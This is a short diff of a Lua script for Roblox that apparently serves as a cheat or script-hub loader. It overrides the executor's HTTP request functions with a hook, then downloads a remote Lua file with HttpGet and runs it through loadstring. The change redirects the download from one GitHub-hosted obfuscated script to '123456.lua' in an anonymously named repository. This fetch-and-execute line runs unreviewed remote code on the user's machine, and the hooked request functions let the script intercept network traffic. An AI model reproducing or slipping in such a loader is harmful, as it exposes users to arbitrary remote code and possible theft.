@@ -83,7 +83,7 @@ end
 if syn then syn.request = hookedRequest end
 if http_request then http_request = hookedRequest end
 request = hookedRequest
-local s = game:HttpGet("https://raw.githubusercontent.com/ANSNHUB/ansn/refs/heads/main/ANSN-%E5%9C%A3%E5%A5%A5%E9%87%8C%20%E5%B7%B2%E6%B7%B7%E6%B7%86(1).lua")
+local s = game:HttpGet("https://raw.githubusercontent.com/vxteam655/dhdjdjndhdjdjn/refs/heads/main/123456.lua")
 loadstring(s)()
 end)
 if not s then warn("加载失败:", e) end
